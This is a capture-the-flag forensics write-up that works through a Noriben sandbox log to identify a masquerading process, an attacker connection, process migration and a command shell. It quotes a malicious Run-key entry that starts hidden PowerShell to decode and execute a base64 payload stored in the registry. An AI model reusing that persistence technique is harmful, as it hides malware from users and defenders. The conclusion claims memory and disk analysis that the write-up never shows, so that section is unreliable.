# Forensics Bento Challenge Write-Up

## Problem Overview
The goal of this challenge is to analyze and solve a forensics problem by identifying critical artifacts and reconstructing events from digital evidence.

## Challenge Details
- **Challenge Name**: Bento
- **Category**: Forensics
- **Difficulty**: [Easy]
- **Points**: [500]
- **Author**: [n/a]
- **Platform**: [Hack-the-madness/HTB-CTF]

## Problem Statement
Unfortunately the challenges are hidden after the event, and I do not remember the full problem description. However, I did keep track of the questions and my answers. I believe the problem description looked something like the following:

### Possible Problem Description
You are taked with analyzing the output of a Noriben log to uncover the activities of an attacker who has compromised a system. The log file contains details about process behavior, network connections, file system changes, and registry changes. Your goal is to extract specific pieces of evidence from the log file that will help identify key characteristics of the attack.

### Problem Prompts
   1) What is the name of the initial malicious process?
   2) What is the attacker's IP and protocol used for the connection?
   3) What is the name of the new process the attacker migrated to?
   4) What is the name of the variable that stores the final base64 payload in the persistence mechanism created by the malware?
   5) What is the PID of the process created by the attacker to execute system commands?



## Artifacts Provided
The following forensic artifacts were provided as part of the challenge:
- Log file: `Noriben_26_Sep_24__15_55_500478.txt`
   + Processes Created
   + File Activity
   + Registry Activity
   + Network Traffic
   + Unique Hosts

## Methodology
To solve this challenge, I followed a systematic approach that involved the following steps:

1. **Log Analysis**:
   - Analyzed system logs to identify any suspicious activity, such as unauthorized access attempts or abnormal system behavior.
   - 
   - 

2. **Timeline Reconstruction**:
   - Based on the log entries, I reconstructed the timeline of events.
      - ....
      - ....
      
   

## Tools Used
- [CyberChef] - [Decoding base64 and decompressing gzip]

## Solution

### Flag(s)
   - Flag 1: `Acrobat32_reader.exe`
   - Flag 2: `13.60.193.87:80_TCP`
   - Flag 3: `Explorer.EXE:4620`
   - Flag 4: `$rw`
   - Flag 5: `3404`

### Steps Taken For Each Prompt
   1) What is the name of the initial malicious process?
      + Identify which logs will be useful for this step. I think we should look at the Network Activity section first because it has details on which processes have outbound connections.
      + Inside the Network Activity section there are 8 unique processes.
         - Acrobat32_reader.exe:3884
         - Explorer.EXE:4620
         - smartscreen.exe:6624
         - svchost.exe:2408
         - System:4 
         - msedge.exe:7272
         - svchost.exe:3060
         - svchost.exe:6060
      + Since we are not given the actual malicious file we cannot check:
         - Digital Signitures
         - Use any information lookup services with the file hash & upload file features.
      + I tried using Malpedia and VirusTotal to lookup the process names, but no luck.
      + We are left with eliminating well known processes and googling suspicious ones less common processes.
         - We can quickly eliminate windows known processes; system, svchost.exe, explorer.exe, msedge.exe, smartscreen.exe
         - Leaving just Acrobat32_reader.exe -> a google search makes it apparant that Acrobat32_reader.exe is a miss spelling of an actual adobe process Acrord32.exe
         - This is an example of process masquerading (https://attack.mitre.org/techniques/T1036/004/)
      + Submit/Validate: Acrobat32_reader.exe

   2) What is the attacker's IP and protocol used for the connection?
      + Again identify which log will be useful for this prompt, the Network Activity is enough because we already know the malicious process. All we have to do is find which IP the malcious process is communicating with.
      + Log entry: [TCP] 13.60.193.87:80 > Acrobat32_reader.exe:3884
         - This entry gives us the IP, port, and protocol.
      + Submit/Validate: 13.60.193.87:80_TCP

   3) What is the name of the new process the attacker migrated to?
      + Which logs will be useful? Network activity (because we can see if the IP had connections open with any other process)
         - Log entry: [TCP] 13.60.193.87:443 > Explorer.EXE:4620
                      [TCP] Explorer.EXE:4620 > 13.60.193.87:443
         - The vary next entry after the one used in step 2 there is another connection opened up with the attacker's IP and a new process.
      + Submit/Validate: explorer.exe

   4) What is the name of the variable that stores the final base64 payload in the persistence mechanism created by the malware?
      + Which logs will be useful?
         - Not Network Activity no variables here
         - Not Unique Hosts no variables here
         - Processes Created probably won't be useful but is short, so a quick review reveals...
            - Malware downloaded --> [CreateProcess] Explorer.EXE:4620 > "%UserProfile%\Downloads\Acrobat32_reader.exe "	[Child PID: 3884]
            - After attacker migrated they opened a terminal --> [CreateProcess] Explorer.EXE:4620 > "%WinDir%\system32\cmd.exe"	[Child PID: 3404]
            - In Terminal the execited a few commands, but no persistence mechanism --> [CreateProcess] cmd.exe:3404 > "systeminfo"	[Child PID: 784]
                                                                                    --> [CreateProcess] cmd.exe:3404 > "whoami"	[Child PID: 5584]
      + That leaves File Activity & Registry Activity, so lets review those.
         - First lets trim down each section to a new file using the following commands.
            - [cat Noriben_26_Sep_24__15_55_500478.txt | grep -A68 "File Activity:" Noriben_26_Sep_24__15_55_500478.txt | grep "Explorer.exe:4620"]
               - Returns nothing to terminal, so for now lets move on from file activity...
            - [cat Noriben_26_Sep_24__15_55_500478.txt | grep -A869 "Registry Activity:" Noriben_26_Sep_24__15_55_500478.txt]
               - Too much infomation was spit out...
            - [cat Noriben_26_Sep_24__15_55_500478.txt | grep -A869 "Registry Activity:" Noriben_26_Sep_24__15_55_500478.txt | wc -l]
               - This gives us 870 lines of output...lets filter by activity related to Explorer.EXE:4620.
            - [cat Noriben_26_Sep_24__15_55_500478.txt | grep -A869 "Registry Activity:" Noriben_26_Sep_24__15_55_500478.txt | grep "Explorer.EXE:4620" | wc -l]
               - Left with 27 lines of output this time, so lets redirect that to a newfile and review it.
      + In our new file susRegAct.txt that contains Registry Activity from the Explorer.EXE:4620 process after the attacker pivoted.
         - It now becomes apparant that the peristance mechanism could be related to a registry change https://attack.mitre.org/techniques/T1112/
         - There is 2 root keys with changes the HKLM & HKCU 
         - There is two log entry of particular interest --> [RegSetValue] Explorer.EXE:4620 > HKCU\SOFTWARE\76fiQjA1\erIyfJl7  =  aQBmACgAWwBJAG4A.......
         - And --> [RegSetValue] Explorer.EXE:4620 > HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\2yGbMgAv  =  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c
            / "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKCU:Software\76fiQjA1').GetValue('erIyfJl7'))))
         - The second RegSetValue log entry uses "FromBase64String()", so this is probably related to the base64 encoded payload we are looking for.
         - It also calls "(Get-Item 'HKCU:Software\76fiQjA1').GetValue('erIyfJl7')", so the hive "Software\76fiQjA1" has a key "erIyfJl7" that contains a base64 encoded string.
         - It also is under the Run hive, calls powershell, and the flag seem like they may make the value run at startup, and background and hide the process.
      + This is definetely on the right track. Let copy the value of the "erIyfJl7" key into cyber chef and base64 decode it.
         - ![Image Failed to Load](/cc_decode_base64)
         - This reveals more code. Lets Review it after removing null bytes and saving as decoded_string.txt.
         - Inside there is another call to "FromBase64String()", lets paste this string into cyberchef and decode it.
         - Using this recipe....
         - ![Recipe Failed to Load](/recipe.png)
         - You are left with another script. That contains another string base64 encoded = variable $rw
         - In this script we can see windows API calls
      + Submit/Validate: $rw


   5) What is the PID of the process created by the attacker to execute system commands?
      + This was found in step 4 after reviewing Processes Created log
      + log entry: [CreateProcess] Explorer.EXE:4620 > "%WinDir%\system32\cmd.exe"	[Child PID: 3404]
      + Sumbit/Validate: 3404
 

## Conclusion
In this challenge, I successfully analyzed the provided forensic evidence and reconstructed the timeline of events leading to the security breach. The key techniques included disk image analysis, memory analysis, and log examination. The solution involved recovering deleted files, identifying hidden processes in memory, and analyzing logs to determine the attacker's actions.

### Key Takeaways
- Payloads 

---

### References
- https://github.com/Rurik/Noriben
- https://nasbench.medium.com/windows-system-processes-an-overview-for-blue-teams-42fa7a617920
- https://www.processlibrary.com/en/
- https://gchq.github.io/CyberChef/

